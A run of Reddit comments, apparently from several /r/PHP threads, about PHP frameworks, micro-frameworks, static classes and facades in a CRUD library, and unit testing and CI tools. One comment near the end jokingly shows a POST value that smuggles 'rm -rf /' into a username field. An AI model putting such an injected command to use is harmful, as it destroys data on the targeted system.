I forgot this is /r/PHP, not /r/programming, mentioning anything but praise for PHP isn't allowed. 90% of GAE is based on other frameworks which you could download elsewhere and set up hosting for elsewhere. Also, the development environment for GAE/Python is actually pretty fantastic.
I'd love to know why my comment was downvoted. Is my reasoning not sound?
Yes, for me its generally do I need a full framework like Zend or Symfony or a microframework if the project is small. Frameworks take care of repetitive code. If you're part of a team, they also give you a standard way to things and where to save files.
What would be a use case for this? Why would you call file_get_contents if you really wanted your own custom function that executes some logic, then calls file_get_contents? I do this all the time w/ helper functions but find it much less confusing to give it a unique name. 
Don't learn a framework. Just kidding. But you are asking the question like you want to hear this answer. Anybody who's serious about their craft needs to explore all there is to become an expert. So it depends on where you want to end up. You want to create simple fun stuff and never earn a living with PHP? Then don't use a framework. Want to become a highpaid, respected senior PHP developer / entrepeneur building serious software? Learn a framework.
Learning how to drive a car takes a long time, but driving a car is way quicker than walking.
Look into micro frameworks such as Silex. If project is a small one using a large framework is usually an overkill but you still want to have routing and other little things to automate some work.
To me, it's almost a better question to ask if I wouldn't use a framework. Recently I was writing some helper admin pages for a rest framework to admin some of the imported data. I thought, I shouldn't need a framework for this, just a few pages and form. Even something as small as that would have benefitted from ci or laravel, and I'm going back and rewriting it into a framework soon now.
Absolutely you should use a framework. Once you are familiar with a framework then setting it up for even a small project becomes trivial, so the act of becoming familiar with the framework will be beneficial to you for the current project and for future projects. If/when the scope of your project changes and you need to add functionality you will be glad that you used a framework. Frameworks typically encourage good organization of code and the design patterns used are tried and true so you're not looking at old code and regretting design decisions based on old/changed requirements. I've never looked back and regretted using a framework. I have often looked back and regretted NOT using one!
Or rather, designing and constructing a car every time you need to go somewhere and then discarding it upon arrival..
i would use a framework for everything. example: * html -&gt; bootstrap * javascript -&gt; jquery * php -&gt; laravel * tests with phpunit * and so on... (this is more webdev, but that kinda goes hand in hand with php) this makes my life so much easier. i see frameworks as a way to reduce [maslow's hirarchy of needs](http://en.wikipedia.org/wiki/Maslow%27s_hierarchy_of_needs) to just the tip of the pyramid. i don't have to do care about cross browser-compatibility, making a router, creating a database abstraction layer, migrations, templates, ... frameworks are awesome. everyone should know how to use them.
Totally depends on the project. If you need substantial things that a framework will provide (user authentication and rights management say), frameworks will generally save you a lot of time/hassle. If you don't need what a framework gives you (sometimes you really don't), then why incur the overhead and maintenance requirement? 
so, I add a response header and email somebody? at what point does the response header matter? where is the benefit?
OK, horror story time. At my last job, I was a back-end maintenance programmer for a small advertising/Web development shop. Out of a team of three developers, none of us had any real development experience or training beyond one or two college-level C/C++ classes (myself included), so the code base for our back-end tool chain was a bit of a nightmare. No coherent design, no documentation, no tests... Just a hundred thousand or so lines of code that had been pushed into production over the course of a series of sleepless and highly-caffeinated nights. I was tasked with re-engineering this monstrosity. This would have been a simple process, except the company had a really strange standing policy -- since no one in the department (or our paralegal) quite understood the licensing terms behind open-source software, we were forbidden from using any third-party frameworks or libraries. This was intended as a measure to merely skirt the issue, but it turned every single task into a goddamned [yak-shaving](http://sethgodin.typepad.com/seths_blog/2005/03/dont_shave_that.html) project. There is a time and place to reinvent the proverbial wheel. If you're still learning the fundamentals, by all means, avoid frameworks for a little while yet. Hell, maybe pick one apart to see how it works, and roll your own version -- this will give you a better understanding of both how and why you would use those particular features. If you want to get anything done, though (whether for a personal or professional project), learn a framework. (Personally, I'm getting a kick out of Yii and its Front Controller pattern implementation. It also helps that it plays nicely with the Doctrine ORM framework.) **TL;DR:** Framework good, yak-shaving bad.
I mainly work on SaaS, web apps, etc. but before that I did quite a lot of work with the Joomla CMS. If I had to do even a simple one page website now I'd use a CMS or at least a framework. Once you really get to know a CMS/framework it becomes faster to make use of the features given to you on a plate than to reinvent the wheel for every project, no matter how small. Even if I were going to render the HTML into static files and push them out to a CDN I'd still use a CMS for managing the site.
My opinion on frameworks is incredibly unpopular, I choose to write functions that I need (Although I often research the way said function is implemented on the most popular of frameworks, since that is usually the accepted as the best way.). Then when I see I use a certain set of functions a lot, I add them to my personal framework. I do this to maximize my knowledge and understanding, but everyone is different. If you have limited time or value you your time highly then I would recommend a framework, since it will do a lot of the work for you.
Yeah, most frameworks are like cars. They spend a lot and they cost a lot and when they broke you're fucked up. I'd use a bicycle. I can repair it pretty easly. My personal framework is my bicycle.
In fact is like humans.txt, there is no profit... But is like show something about your development team :)
I was going to answer something different, but as i read the others posts, i realize the hard true: frameworks are the only way. In my personal case, I developed a semi-framework that I use in my apps, but this is now that i spent a few years improving it. I guess it would have been a lot easier to just jump into Symfony o Zend from the start. Anyway, I like my code, and I feel pretty comfortable, but I have to admit, it has flaws.
That sounds about right. It takes a lot more time and effort to get the same job done. :)
A more serious answer from me, the importance of using a framework is now much less than it used to be thanks to Composer. Many "micro-frameworks" are just a routing component strapped to an ORM, which you could set up with two composer packages. Evaluate your options and don't use more than you need.
You don't need to use a framework for every project but you do need to understand frameworks in order to make the decision. The best way to understand something is to use it. 
Kind of to this point, remember that attacks are usually seldom in isolation and if there's a local file inclusion vulnerability in your app, it could be relatively trivial for someone to overwrite something in /tmp...especially if the (shared) web server put it there.
You can have a look at PHP-VCR https://github.com/adri/php-vcr to have an idea. Additional use cases: custom failover logic for mysqi_open, ldap_bind. Security checks, audit logs and much more. Main idea is that it's possible to intercept functions in vendor frameworks and libraries without patching them by hand.
One word: Structure!
Oh don't be such a whiner.. You're the one who started with a flippant one-line comment, so I simply followed suit. If it helps I didn't take your comment seriously, so feel free to do the same with mine.. The OP was asking in /r/PHP about developing in PHP.. Suggesting Python and GAE is not a bad thing on it's own, but it's kind of off-topic in this particular conversation... Plus, without any talk about his environment, one can assume he might be on Windows, and I'm guessing setting up PHP to do local development in Windows is easier than GAE, correct?
I would definitely recommend learning at least one large framework and one microframework. Use the large framework for projects with a pretty big scope, and use the microframework for simple little CRUD sites or to learn new libraries. For example (a Python example, but still an example), I use Django for most of my projects, but I Flask to learn and practice SQL Alchemy.
Saying "Laravel vs PHP" is like saying, "words vs letters" - you use the latter to build the former. If you are shaky on object oriented programming then focus on that for the time being as it is the foundation for MVC frameworks like Laravel.
"Everyone should write their own framework once, then throw it away" - @auroreosrose
I found that the experience i got from coding my framework, helped me understand how fameworks work altogether
Not using a framework is like only willing to fight with your hands and feet. On the other hand, *only* knowing how to use a framework is like owning a gun but not knowing how to fight. 
You can find much knowledge regarding frameworks and "raw" PHP in this current discussion [thread](http://www.reddit.com/r/PHP/comments/1l4j1s/would_you_use_a_framework/). And many others when using term "laravel" as search parameter. Regarding my opinion, Laravel is one of the best frameworks I have worked with. No spagetti code, clean syntax, understandable documentation, composer and packages, vagrant, damn I love my developer life!
Yes, but only use one wrote by someone else if you don't have much time; if you do have the time then you will only benefit from writing your own.
The only thing I wish is it would allow for multi carrot editing like sublime text edit 2. Holly man is that fantastic. 
Thanks for the help but... What does the "\" inside of "extends \REFormsModel" do in simple terms I'm a little shaky on the terminology?
I didn't know it was possible! This looks like what i was wondering how to do all along. I'll give it a go tonight. Thanks.
If it is a hobby to pass the time, then do feel free to reinvent the wheel, learning your mistakes the hard way, naturally. If you want to get stuff done at the application level though, then go for a framework and run with it.
Cool. Remember, Composer is not a PSR-0 autoloader, it HAS a PSR-0 autoloader as part of its general autoloading functionality but it's designed to work with any code.
A solid framework with a good ORM will save you a lot of time. The vast majority of webdev are CRUD operations, routing, and template rendering. There is almost no overhead setting up an app on framework. You literally start coding just as quickly (+/- 15 minutes). After you get into a setup you like, just commit it into it's own repo and the next time you need to do a project, just clone that and delete the .git folder and re initialize in its own repo. Bam you're done! 
Yeah, that's a fantastic thing to know. It had me puzzled as how it could be so restrictive yet at the same time so popular. I'm happy that the usually when something is harder than it should be it usually is rule still applies... 
I'm gonna go and play the devils advocate here... There is almost no reason you WOULD need to remember how to write things in the language the framework/library/language is written in. eg: jQuery deals with all the horrible things about Javascript. It solves them for me, so I do not have to think about it. Same goes for frameworks. Same goes for every higher language. When you really want to know what's going on, you can delve into the library's or framework's code to see how they are doing it. But the times you have to do that is almost non-existant, because 99.99% of the time there is a solution within the framework/library/language itself. The important thing is that you can write, test and optimize your code. It doesn't really matter how or with what you wrote it. 
Do you see a downside to using this type of a setup inside of a wordpress plugin? RGForm.. is a class that's inside another plugin that I'm extracting functionality from. I mean aside from the usual check to make sure it exists etc. If i could figure it out for this project I'd love to have this use Dependency Injection and autoloading but I'm not sure If i'm there yet. I'm also coming specifically from a .net background where the entire system is all coded in a single standard way already. So I've never had to go in and design my own. Thanks again for the help though!
Kohana is almost dead now. The team has not been very active the last 6 months. You can still probably use it for a couple of years, but when you want to invest in the future, go Symfony.
^^There ^^are ^^people ^^who ^^use ^^jQuery ^^*without* ^^knowing ^^Javascript? Anyways, thanks for the answer. Is there a reason you know so many frameworks? And which would you recommend learning? I was thinking of learning CodeIgniter, but it might seem like overkill in my case.
 oh and let's not forget the giant mess that deals with loading front end stuff like css, js, templates, cleaning posts, gets, cookies... etc.
There are more lightweight frameworks than Zend, that are easier to learn. Whenever I tried to -not- use a framework, in hindsight, I feel that I was reinventing the wheel a lot. Learning to use something like LightVC or Silex doesn't take that long but you get the benefit of routing and controllers/views, and other things that you probably (should) use. The alternative is junk like .htaccess files, mod rewrite crap, and let's be honest, that really is not an acceptable alternative. At best you could use it to write your own solution, though you might find that in the end you've written your own crappy version of a bloated framework. :P I do think that using something like Zend is overkill, and even a little nasty. Awkward project structure, tons of code to perform tiny tasks, lots of features that I would never use... I've yet to look into CodeIgniter and Symfony though, and was planning on starting with Symfony. I too wonder if it'll be worth it.
I try to keep advanced business logic free of frameworks or use very basic components of symphony. I think code that are less binded are easier to unit test, refactor, and if I need to, convert bits and pieces to maybe a different language.
Thanks for the answer. I had no idea there were 'micro-frameworks' before coming here, I was simply looking at the larger ones like CodeIgniter. I'll certainty take a look at those.
Thanks for the answer. I will take a look at micro-frameworks, they might just be what I'm looking for.
Thanks for the answer. Can you explain more about what a database abstraction layer is? How long did it take you to familiarize yourself with Laravel?
Thanks for the answer. Haha, that sounds terrible. I'm not working as a developer atm and am simply learning PHP for enjoyment, but I have never considered this before. Thanks!
This is the route that I'm going with upgrading legacy projects to modern practices. It basically allows me to replace one section at a time, getting rid of hundreds of lines of shaved-yak code for each phase. In this case when I say legacy, I'm referring to ["Antiquated and In-House Code"](http://whateverthing.com/blog/2013/07/10/run-down-by-the-maintenance-cycle/)
Honestly, the static methods and singletons are worrying. 
Thanks for your feedback, /u/Nicoon! The rationale behind that is to call the class (there is a single static 'Sashimi' class) directly like a library, so that any third-party code can use it without worrying about how it was instantiated. (I admit to be a fan of static classes) Why are static methods worrisome?
Sure, a framework is a good idea for a lot of (probably most) things. I'm thinking of a project say that has no need for crud operations even. Say a passthrough API endpoint, or something like downforeveryoneorjustme.com Really no need for a framework for something that simple. 
I've used Flight, but Silex is one of the better supported ones. It's Symfony based. Slim is also pretty good. They basically all work the same way, mostly handling routing and views. So that takes care of VC and you can write classes to be your models. They're particularly good for adding an API to an existing codebase.
"Familiarise yourself" is a vague term. You could probably get something up and running, basic post guestbook or something, within a few days. I could now (literally) do it within 30 seconds. But I'm still learning. I would say I'm "familiar" with Laravel. But I'm certainly not an expert.
"Legacy by design". Love it. Definitely been there.
well, i started with zend, didn't like it, went over to yii, loved it, but i still had some issues. now i am using laravel. it was very easy to get into for me, because i already knew composer and the mvc pattern (zend and yii used it, too). laravel was pretty much one day of reading and trying out until i knew how to use it. a database abstraction layer. well, there are many database systems like mysql, mongodb, ... when you want to access them, you have to write different code for each of them. a database abstraction layer takes away the complexity of the database system itself. at some point in the configuration you just have to say "this db is a mysql db" and then it does everything for you. when you hit the save-to-db-button on an object, it just does it, without you writing any queries or anything at all.
They're pretty much untestable, for one.
You mean unit tests? Why are they untestable? Thanks, appreciate your help.
Kohana team dev here. While I'm pretty much not helping anymore, there is still members who have an invested interest, they will keep up on the security fixes and maybe even improve if we get more support 
If you have a solid architecture in mind and know the consequences of the choices you're going to make then sure ditch a framework and piece different things together as you need. If you don't really know, then just follow a regular MVC pattern until you learn what is good/bad about it.
There are plenty of issues with statics. An example would be not being able to run two simultaneous instances. What if I have mysql connection open, but also need to open a separate connection to a sqlite database? If you don't want to be bothered with instantiation, have a look at a dependency injection container instead. 
The tool supports database switching, but it's supposed to be a very simple tool, and limited on purpose, to keep it simple. Personally, I've never had to switch to another database. Also, I don't want it to be possible to have more than once instance. This was devised as tool that other classes call and it's always available, attached to the main database connection, it doesn't make that much sense to me to have two instances if you want to keep it simple. Static is cool because you just do: $books = Sashimi::find('Book', 'ORDERY BY author'); and it's pretty easy this way. Still, it's definitely possible that I'm missing cons of static classes. I'll definitely take a look at dependency injection, I read about it but would love to look it up again. Thanks, I appreciate your help and pointers!
Jira and Confluence here
I am familiar with CakePHP and I am glad about that. See [this comment](http://www.reddit.com/r/webdev/comments/lf56z/just_wanted_to_complain_about_mvc_frameworks/c2sm7v0) for reasons why frameworks are a good idea.
You can't mock static methods.
&gt; There are people who use jQuery without knowing Javascript? Not sure if you're kidding, but I think what the parent was referring to here is just learning how to use jQuery enough to set up event handlers in the DOM that react to mouse or page events, and that's enough. jQuery is excellent at doing this, and you can make good use of all that functionality without really understanding how to write useful code in Javascript from scratch, or learning all the intricacies of the Javascript language. Let's take a trivial example: $("#button").one('click', function(e) { alert('This will only be shown once'); }); This is some pretty simple jQuery that anyone can figure out from the jQuery docs, but it actually does something relatively clever (attaches an event to your DOM node that only fires once, then removes itself), and I suspect a lot of people wouldn't be able to replicate this in plain-old-Javascript, or would struggle to get it right. And in a lot of cases, that's perfectly ok! jQuery enables tons of people to Get Things Done and move on.. The difference is whether you want to be a "good enough" programmer, or whether you strive to make programming your vocation and learn enough of it to be able to innovate and develop your own solutions or improve those of others. Both are valid choices, depending on your priorities..
What would you say is the big advantage of using this over PDO and retrieving my rows as objects?
And then someone inherits your bicycle, sure its yours and that is great, but he comes to find that it only has half a handle bar and doesn't quite drive the way you would expect. Whenever he wants to change gears he has to figure out that he needs to jump on the seat twice in order to into second. Finally he notices that the chain is made of paper clips and will soon need renovation. *Metaphor aside* Every person who I have heard "make their own framework" always fails to realize that their take on something is not ideal for everyone. Additionally when you roll your own framework, you are betting that you know more than the dozens of developers who work on a framework, this is never the case and it is simply not secure long term.
Well, if you need my framework to be a shit to make your point then ok, you're right. End of discussion.
A sub question, what ide is best when using a framework? My college forces us to use Dreamweaver and I recently started working as a full time developer. I can use any tool I want and the boss is cool with me using a framework. But they are confusing to me and I wonder if it has to do with my ide? I'm pretty good with php using notepad++ or Dreamweaver in code view, but I can't help but wondering if I am missing something.
the jquery comment was just for laughs but anyways. well what i would recommend really depends on what you want to do. did you want to learn how to make a website for a friend? or were you interested in kinda how it works? ive used a number of frameworks just because i like to know how things are written. Looking through things like Laravel or CodeIgniter kinda show you how other people write things and you pick up on new techniques you wouldn't have otherwise found.
I definitely see your point and its a really good one for someone who only does web work on the side. When you go to work for a company thats been around a number of years, they're probably not using only jquery, theres gonna be a lot of proprietary work in there.
I've been hearing about Zephir for the past week or so on Twitter (thank goodness for that resource, I am exposed to things I may never have found on my own). I've browsed the Zephir docs a bit, and this conversation has brought up a few points that I could use some clarification on if anyone has the time/knowledge to comment. From what I understand, Zephir is sort of like an abstraction language for building PHP extensions. The Zephir docs mention that they are compiled extensions. Does this mean that the end result is compiled extensions with the same/similar byte code as if I created the same extension in C? What I'm getting at is that just because I use the Zephir language to create extensions am I'm getting similar results to using C from the outset? I'm interested in looking at the possibility of converting some core packages of a project I'm working on into extensions with Zephir, but I'm a little ignorant about performance gains or what's really going on internally to decide if there will be that much of a gain, and if it would only be in certain situations. Does anyone have any experience with this, or comments to share? I've also been looking at Go. Right now it's a toss up for me between taking time to learn Go vs Zephir. I love PHP, it will always have a special place in my heart, but like any artist, I'd like to play around with another medium while expanding my knowledge and tool set. The thing that makes me lean towards Go is that it's a general purpose language, so I would be able to explore area's outside of web development. And to comment on the Python/Go discussion. Other than language constructs and syntax differences, I thought Python is an interpreted language where Go is lower level compiled language, hence there is potential for higher performance (as long as you're code isn't horrendous).
Ahh... I see, thanks!
An ORM in general is a huge advantage. This isn't a very good ORM, though, with all due respect to the OP.
Have you contacted anyone with Yii? I will reach out tomorrow.
not to start an editor war, but I'm a fan of phpstorm. I tried netbeans and eclipse, but phpstorm has been the one I've managed to stick with the longest.
Silex is a good start, its built of of symfonyc components. AuraPHP (http://auraphp.com/) is on my radar as one to try too.
You can always just make a variety of parts, and with them, make an SUV, a Roadster, a Truck, a Van, an airplane... whatever you need whenever you needs! 
And in busy cities, sometimes you get there much faster with a bicycle...
I drove many cars through my 15 years as a driver... but always faced certain problems... some were good on certain things but lacking on others... It was always hard to find a car cheap on gas and at the same time fast enough... or one with a nice design but also good of road... some were to big for high traffic cities and hard to get parking, others to small to carry stuff... Of course it was always faster to get there with a car, but certain conditions were making me spend a lot of time choosing and learning the right car for each trip. But with time and better knowledge of mechanics, and also knowing many cars engine, I started collecting parts, making my own parts, and this way, I have a collection of parts that allow me to make a car for each trip. I dont need to spend time looking for cars and learning to drive them. I know all the parts very well and can make whatever I want with them, from a bicycle up to an airplane. I'm even made robots that help putting parts together. In the end I don't finish spending much more time than picking a car that I already know because every trip is different and they are usually long. By the time I pick to drive the same car again it has already changed or I had forgotten something. 
There are micro frameworks. It's hard to call anything that wouldn't benefit from a router and controllers a project in any sense, so you are already winning on those points alone. E: Reading, I see lots of others also pointed out micro, sorry to flog the horse so much. Just wanted to add that both the Symfony Framework (full stack) and Silex (micro) are built on the Symfony Components, so learning either of those will go along way to learning the other. I'd actually recommend following along with Fabien as he builds Silex to get a good understanding of why/how frameworks work http://fabien.potencier.org/article/50/create-your-own-framework-on-top-of-the-symfony2-components-part-1
These arguments are pointless, as long as we can have our work done, what does it matter to use which language? I've seen lots of people claiming that some language is the best in the world and others are just junk, turns out they are wasting time.
It realy depends on the project, Frameworks can do a lot of heavy lifting for you, removing the more tediously repetetive parts of coding. But often enough no framework fits the project very well. Instead of trying to make the framework bend to my needs I'll start from scratch. Or use just modules from a fully decoupled framework such as [Aura](http://Auraphp.com). So to answer Your question specifically, frameworks such as Aura, which allow you to use just that handful of features you need... would be a good choice. That being said, I strongly advocate that you understands what makes a framework tick, try to understand how Autoloading, Registry, MCV work thoroughly. Instead of blindly following and tweaking tutorials.
This is a bad analogy. Learning to drive a car is like learning programming itself. The result being, you can make a computer do things quickly, that would take a long time if you were to do it manually. Learning a framework is like learning to operate any specific car.Things like where are the controls located? What each one do? You can say that using plain php is like using a simple car without any bells and whistles. Using a framework may be like driving one with all the safety features like ABS, seat belts and air bags.
It got big because it was one of the first "looks like C" and is easy to use web frameworks. 
Hi! Retrieving is pretty easy but, I think associations are cooler, ex: Sashimi::attach($myPage, $myBook); Sashimi::associate($myAuthor, $myBook); There is also a "sandboxing" mechanism, which I think works well when you implement communities or systems that have users that have their own stuff. Every object has a container path (ex. /books/my_author/). That author could add his own books without being able to see or edit other author's books. Sashimi could than switch to container /books/ to retrieve every author's books. I think this is good to have at a low-level. 
Thanks for your comment! &gt; You don't have to define the relationships when you use them, because you defined them in the model. Your approach seems to miss the point of that. It seems, if I read correctly, that you have to request these relationships each time you use that table, with your getRelated methods. Yes, if you want to get author of a book you have to request it every time. I wanted to keep it simple, avoiding to have configuration files or models. &gt; Your approach also seems to miss the point of using an ORM at all as the level of abstraction doesn't seem to in any way abstract out. Sashimi::find("Book", "WHERE author='George McFly'"); Seriously? You have the whole "where" clause in there? What's the ORM doing then? Because it doesn't seem to be really taking much out except saving me from the burden of writing "select *". Not, all in all, the hardest part. It's not really ORM (see comment), I call it CRUD/ORM because it's for CRUD operations, but with relationships and a few other things, and it looks like a ORM tool. In reality like I mentioned it's built for MySQL and its goal is not really to abstract the database. It's just to make some operations quicker. &gt; All in all, I wouldn't use Sashimi. I'd rather use Eloquent. Or Doctrine. I think they're better solutions to the problem. What are the main reasons? What could I improve? &gt; the tool creates tables and columns on the fly That bit scares the shit out of me. Creating tables is only for development. When you initialize you can of course specify that you don't want tables to be created on the fly. Thanks a lot for your comment, I really appreciate it. 
Sorry, that wouldn't happen. The object is a facade object, that's why it's static. Tests would not interfere because there is no state to manipulate. The object is simply there to call methods that manipulate _other_ objects.
No, no it's not really a full-blown ORM tool like I mentioned, although it looks like it ,that's why I say it's a CRUD/ORM tool for lack of a better term (that I can think of). I wanted to say CRUD tool but it also does other things. Would it be less confusing if I simply went with "CRUD tool"? Would it still make sense that it has relashionships and other things? What would be a better term?
It would be clearer, yeah. It's not (really in any way) an ORM. It's a crud tool. Actually, really only the CU part of that. Anyway, dropping ORM from your description would be useful.
I will do that, thanks! Why CU..? It also retrieves and deletes ;-)
Note: The link to a gist is not an error. It's the guy's blogging platform apparently.
If you are just doing things on the side, or have been hired as a HTML, CSS, jQuery developer, it's probably gonna hold tight, but if you are hired as a web developer, I would expect you to know what goes around inside jQuery. If you don't, when jQuery breaks, misbehaves or something, you will look foolish because you are not able to dive into jQuery and figure out what is wrong. Or you might have to spend five hours at this, where someone with good Javascript, DOM and jQuery knowledge could take educated guesses from the start, and fix the thing in one hour. It surely depends on the context. If you are hired as a Python dev, people probably won't expect you to know C nor the details of how Python is implemented and what goes on underneath the hood. But if you do, you're ultimately a better asset and probably a better python programmer since you can reason about it on another level, and perhaps are able to be creative with it because you know the basics of how the stuff works and not just how to use it.
This!
&gt;Sorry, that wouldn't happen. The object is a facade object, that's why it's static. You failed to mention that it was a façade, but nevertheless, yes, it can manipulate the same state. A façade is tied to a specific instance, meaning that whatever code which calls the static methods would all manipulate the state of the same underlying object. 
Lot's of people actually do this. It's a *thing*.
You don't seem to understand what a façade is. Your façade is a static interface to an object to which it is tied to. If you access the static members of the façade, you are indirectly accessing the underlying object. If all your code is accessing the façade, it's all going to be manipulating the state of said underlying object. 
I thought a facade was an object that served as a single interface to other APIs or objects. Wikipedia seems to say the same thing: &gt; A facade is an object that provides a simplified interface to a larger body of code, such as a class library. A facade can: - make a software library easier to use, understand and test, since the facade has convenient methods for common tasks; - make the library more readable, for the same reason; - reduce dependencies of outside code on the inner workings of a library, since most code uses the facade, thus allowing more flexibility in developing the system; - wrap a poorly designed collection of APIs with a single well-designed API (as per task needs). We might have misunderstood each other, but in any case, the above is what I meant with 'facade'.
TBH though, how many times did you have to delve into jQuery's codebase? I've been in the webdev field for over 5 years now, and never had any jQuery problems where I had to that. There's always someone on StackOverflow or other fora that had that problem too, and it probably wasn't caused because jQuery broke. Ever tried writing more than 1000 lines of cross-browser vanilla JS? It's maddening. You *might* be a better developer when you know what happens under the hood. But if I had to choose between these 2 Python profiles: - Knows Python, Perl, C++ and C. Does not know how to unit-test and benchmark his code. - Only knows Python. Knows how to unit-test and benchmark. I would choose the last one.
I've always viewed this sorts of tools in a negative light. If you give someone encoded code, if they want it badly enough they *will* decode your stuff. If you want to provide an application without giving away the source code, consider a saas.
Correct, but that's still what's expected...I was more talking about things like [0-9a-zA-Z] or special characters in the input than formatting. Some things, like credit card numbers or dates, are easy to reduce down because they're standard formats. Free-text fields are, obviously, a bit tougher as you sometimes have to do more of a blacklist than a whitelist approach.
Please do write more, this one was a fascinating read.
Okay, let me break it down for you. 1. Façades do indeed wrap other objects. 2. Your façade is a static class. 3. Interacting with the façade will change the state of the object it wraps. 4. Changing the state in one place can lead to an unexpected result somewhere else. 
No, making your own car is not quicker than buying one, however clever you might feel doing it. It's a hobby, and should never be considered any more than that.
Define huge. That is relative. Look at the features a framework offers you, and if it does what you need then use it. [Your Framework Choice Doesn't Matter](http://www.gregfreeman.org/2013/your-php-framework-choice-doesnt-matter/) As long as it does what you need, its hardly ever "too much", unless you're doing a homepage + contact form type site, in which case you don't need much power.
Nobody requires you to use all Zend Framework features - I use lots of other libraries with no problem as alternatives. Most of the classes in a full install are never loaded in a request. You can even use Composer just to grab the bits you want. Being bloated is in the eye of the beholder. One man's bloat machine is another's time saver in the long run.
I looked at wordpress and wasn't very impressed by the codebase so couldn't commnent. I find the community is the thing that makes drupal good and they always seem to implent things very well. For example they are rewriting alot of the code base using http://symfony.com/ framework relacing alot of the old spaghetti code with newer php5.3 stuff ie namespaces http://php.net/manual/en/language.namespaces.php 
Agreed. I use small frameworks for simpler projects like CRUD. So long as you maintain your domain separate from the framework mechanics it's pretty easy to migrate up in size if it becomes necessary (rarely does for CRUD but when it does...).
This is a continuation of a code review from [my earlier post](http://www.reddit.com/r/PHP/comments/14t4ae/small_mvc_for_php_code_review_stack_exchange/).
you see &lt;?php class foo { public static function bar() { echo "Hello World from bar"; } public function bat() { echo "Hello World from bat"; } } $func = ['foo', 'bar']; $func(); $func = [new foo, 'bat']; $func();
I understand what you're saying, but in this case the APIs it wraps all manipulate objects that you pass to the methods and that's all, so the results aren't as unpredictable. The only thing in common is the database, so if you wanted self-contained tests you'd have to create a database on the fly, but I think working on the same database is pretty normal. I appreciate your pointers, and I'll look into making sure that the main class being static doesn't cause any problem, but I don't necessarily see it as a major pitfall. You're calling the library when you call Sashimi, just like (let's say) GD or other libraries, and I liked it better like this. All the class does is writing and retrieving data from the database, so it made sense to me as a static class. In unit tests, any test can call Sashimi and besides obviously the data written on the database, the class can be called simultaneously as many times as you want, and its state or that of other objects which are not the data containers you pass to it are left untouched. 
Just some quick pointers, try [a more git-centric approach](http://stackoverflow.com/questions/115983/how-do-i-add-an-empty-directory-to-a-git-repository) to retaining empty directories in a repo. It's less confusing. The another thing to consider is using existing components from other projects (Symfony has some great ones) and make it all work with composer. 
Thanks, 'ppreciate it. Part three coming in a couple days.
There are a mass amount of issues, sorry. I was going to comment on the CR, but it would be a lot of text. I recommend you follow the PSR-2 standards. Even if not, no need for exit()s, assuming all exceptions are a 404 not found, inconsistent spacing (sometimes 0, 1, 2, or 3 spaces before a brace), non-lowercased keywords, stdclasses instead of actual classes, no type hints on arrays, etc. Sorry, not trying to be offensive, but mainly try to make every character you type count and be as consistent as possible. Look into other popular PHP projects to see how they do it.
&gt; Unit tests involves testing the smallest unit of code possible. What is smaller than a tiny method with purpose of creating a directory on a given path parameter? Doesn't testing it belongs unit testing scope? I'll read your article now, although I should have readed it before since I have your website on my bookmarks. What do you refer to smallest unit in a code? A tiny gettler method? A tiny method which calls a callable? Or even smaller things? (like what) &gt; You're confusing several terms. If you mean XDebug, I know it's not a testing tool. I ask my questions on both testing and debugging. :) Those two areas are my biggest downsides. &gt; Selenium is a web driver. It is used to automate your browser's actions. You click button id="submit" and you see "Congratulations!". Yes, same as Codeception's acceptance and behaviour tests. If it doesn't see "Congratulations!", test fails. However, do you actively use Selenium during testing process? Is it important? Also, why Selenium and not Codeception or vice versa? I know unit tests are incredibly important (I don't currently unit test though) but what about acceptance and behaviour tests? Should I write Codeception tests instead of pressing F5 to be better developer overall? &gt; Glad to know you've enjoyed PuPHPet! I actually gave it a try few days ago and got hooked to it since then. It's an amazing work you did. I'll probably contribute to it in the future.
Just a note about the Codeception and Selenium overlap... Codeception can use Selenium to drive actual browsers to execute your acceptance tests, or it can use it's own PhpBrowser class that is just what it sounds like: a faked browser in PHP. The PhpBrowser has some benefits and limitations. It's faster than Selenium as it doesn't have to boot / manage a real browser, but it also doesn't parse Javascript and so cannot really be used to test Javascript UI stuff. The good news is, you can swap in Selenium for PhpBrowser, and vice-versa, and all your tests will continue to function, as long as you're not testing JS UI with PhpBrowser that is. If that is the case, just create a separate test suite for Selenium to run. I personally run all acceptance tests on each commit, via my Continuous Integration server (currently Bamboo, but I'm looking at Jenkins next). I have Bamboo hooked into my IDE (PHPStorm) and get a little green or red bubble a minute or two after each commit that tells me if everything passed or not. I love this setup. If you decide to try out Jenkins, check this out: http://jenkins-php.org/
Being static is guaranteed to cause testability problems. You can't mock static methods. Erego, any code that uses static methods becomes co-dependant on the static code (and any dependencies it has), making it impossible to *isolate* the system under test. One of your biggest problems is going to be this: Sashimi::init($connection_string[, $db_user, $db_password, $driver_options, $allow_changes]) You aren't injecting the database connection, relying instead on internal code creating that connection. Any code which uses `Sashimi::init()` will now attempt to create a *real* connection, even inside a unit test. The static facade makes testing hard/impossible in other ways, too, but suffice it to say that while it's possible to test your own underlying implementation using proper mocks (if you expose that interface), the facade itself is untestable, and will make testing any code which uses it a royal PITA as well.
Debugging and testing are two different things. I debug primarily with logging, because there's nothing like pdb for php. There are many views on how you should test, and the one you choose is a matter of personal preference and your situation; things that are suitable for an early-stage web startup are usually not for an established bank. One common testing strategy is TDD. Contrary to the common condition, it is not writing all your tests upfront before any code. Instead, you write one failing test that looks for the simplest case, then write the minimal amount of code to make it pass. Repeat until satisfied. TDD tends to lead to total test coverage. Another approach, which works well on established codebases, is to write a regression test that exposes the bug every time you are fixing a bug. This leads to a lot of tests on parts of the code that break frequently without wasting your time on the simple, stable parts. It also helps prevent the same bug from happening again, which is always embarrassing. You may run a test manually during development, but the entire suite should be run automatically on a regular basis. Often at least a subset is run on every commit - this is called continuous integration, and there are a bunch of services for it. At work, we experimented with Jenkins but ended up writing our own: https://github.com/danielbeardsley/cimpler One of the big topics in web operations right now is that testing and monitoring are the same thing - one is making sure everything works before you deploy it, and one is making sure everything works after you deploy it. If you're interested in learning more about this, I have some resources I can share (but won't do so now because I'm on my phone). Computers are dumb, but they're also fast. Give them the dumb things to do, cause you've got better things to do with your time. 
Thanks for your feedback, /u/drrcknlsn. I'll look into injecting the database connection, I'm not familiar with that (obviously).
Uppercase lowercase issue has been brought up before. It is a big mishmash of confusion on my part. The spacing is my IDE... it for some reason spaces the files off sometimes.... They should **all** be 4 space tabs. And if you could please post on CR about PSR-2 standards etc and how I can improve that would be **amazing** :-D A lot of text is good, it may help me out so much. I am actually using this code in production and I would very much like to improve it.
funny man....
You sanitize your input, right? `POST http://www.domain.com/script.php` `username=; rm -rf /`
How are you generating the encpass?
